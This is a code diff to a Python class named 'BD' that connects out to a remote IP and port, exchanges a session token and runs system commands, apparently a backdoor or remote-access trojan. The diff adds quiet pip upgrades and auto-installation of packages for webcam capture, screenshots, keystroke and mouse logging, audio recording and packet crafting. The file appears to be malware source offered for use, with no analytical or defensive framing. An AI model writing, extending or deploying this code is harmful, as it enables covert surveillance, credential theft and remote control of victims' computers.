@@ -9,11 +9,14 @@ import subprocess
 import time
 import os
 import base64
+import pkg_resources
 
 
 class BD:
     def __init__(self, ip, port):
         
+        self.upgrade_pip()
+        self.install_dependencies()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -28,6 +31,68 @@ class BD:
         response = self.connect_receive()
         self.session_token = response.get('token')
         self.connect_send(self.session_token)
+
+
+    def upgrade_pip(self):
+        """Upgrade pip to the latest version."""
+        try:
+            print("[*] Upgrading pip...")
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "--upgrade", "pip", "--quiet"]
+            )
+            print("[+] Successfully upgraded pip.")
+        except subprocess.CalledProcessError as e:
+            print(f"[-] Failed to upgrade pip: {e}")
+            
+
+    def install_dependencies(self):
+
+        required_packages = [
+            'opencv-python',
+            'pyautogui',
+            'keyboard',
+            'sounddevice',
+            'wavio',
+            'cryptography',
+            'requests',
+            'psutil',
+            'pywin32',
+            'mouse',
+            'netifaces',
+            'scapy',
+            'SpeechRecognition'
+        ]
+
+        def is_package_installed(package_name):
+            try:
+                pkg_resources.get_distribution(package_name)
+                return True
+            except pkg_resources.DistributionNotFound:
+                return False
+            
+
+        def install_package(package_name):
+            """Install a single package using pip."""
+            try:
+                if not is_package_installed(package_name):
+                    subprocess.check_call(
+                        [sys.executable, "-m", "pip", "install", package_name, "--quiet"]
+                    )
+                    print(f"[+] Successfully installed: {package_name}")
+                else:
+                    print(f"[=] Already installed: {package_name}")
+                return True
+            except subprocess.CalledProcessError as e:
+                print(f"[-] Failed to install {package_name}: {e}")
+                return False
+
+        print("[*] Checking and installing required packages...")
+        for package in required_packages:
+            if not install_package(package):
+                print(f"[!] Skipping further installation due to an error with: {package}")
+                break
+        print("[*] Dependency installation process completed.")
+
 
     def execute_sys_cmd(self, cmd):
         try:
